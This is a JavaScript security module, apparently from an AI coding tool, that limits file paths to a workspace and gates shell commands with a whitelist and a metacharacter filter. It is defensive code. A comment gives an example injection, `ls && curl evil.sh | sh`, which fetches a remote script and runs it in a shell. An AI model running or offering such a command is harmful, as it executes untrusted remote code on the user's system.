// security.js — workspace confinement and command gating.
import fs from 'node:fs';
import path from 'node:path';
import { config } from '../config.js';

const SAFE_COMMANDS_WHITELIST = [
'git status',
'git diff',
'git log',
'git show',
'npm test',
'npm run test',
'ls',
'dir',
'pwd'
];

// Shell metacharacters that turn a benign prefix into an arbitrary command
// (e.g. `ls && curl evil.sh | sh`). A whitelist match containing any of these
// must NOT bypass the safe-mode confirmation. IMPROVEMENTS.md §1.1.
const METACHARACTERS = /[;&|`<>\n]|\$\(/;

// Checks if a command belongs to the safe commands whitelist. A whitelist
// prefix match is only "safe" when the whole line is free of shell
// metacharacters — prefix matching alone is injectable.
export function isSafeCommand(command) {
  const cleanCmd = command.trim().toLowerCase();
  const matched = SAFE_COMMANDS_WHITELIST.some(safeCmd =>
    cleanCmd === safeCmd || cleanCmd.startsWith(safeCmd + ' ')
  );
  if (!matched) return false;
  return !METACHARACTERS.test(command); // reject injection attempts
}

// Resolve and validate paths inside the workspace, protecting against path
// traversal AND symlink escape (a symlink inside the workspace pointing
// outside must not allow reads/writes outside the sandbox).
// New files (not yet on disk) are validated through their nearest existing
// ancestor so `writeFile` keeps working for fresh paths. IMPROVEMENTS.md §1.2.
export function resolveSafePath(userPath) {
  const resolved = path.resolve(config.workspaceDir, userPath);
  let workspaceReal;
  try {
    workspaceReal = fs.realpathSync(config.workspaceDir);
  } catch {
    workspaceReal = config.workspaceDir;
  }

  let real;
  try {
    real = fs.realpathSync(resolved);
  } catch {
    // Path does not exist yet (write path): validate via the deepest existing ancestor.
    let dir = path.dirname(resolved);
    const remainder = [];
    while (true) {
      try {
        real = path.join(fs.realpathSync(dir), ...[...remainder].reverse());
        break;
      } catch {
        if (dir === path.dirname(dir)) { real = resolved; break; } // reached root
        remainder.push(path.basename(dir));
        dir = path.dirname(dir);
      }
    }
  }

  const relative = path.relative(workspaceReal, real);
  const isOutside = relative.startsWith('..') || path.isAbsolute(relative);

  if (isOutside && real !== workspaceReal) {
    throw new Error(`Access denied: path "${userPath}" resolves outside of workspace "${config.workspaceDir}"`);
  }
  return resolved;
}

/**
 * Validates a persisted or shell-reported working directory. Returning null
 * instead of throwing lets callers safely fall back to the workspace root.
 */
export function normalizeWorkspaceCwd(candidate) {
  if (typeof candidate !== 'string' || candidate.length === 0) return null;
  try {
    const resolved = resolveSafePath(candidate);
    if (!fs.statSync(resolved).isDirectory()) return null;
    return resolved;
  } catch {
    return null;
  }
}

// Generate and display diff using centralized UI
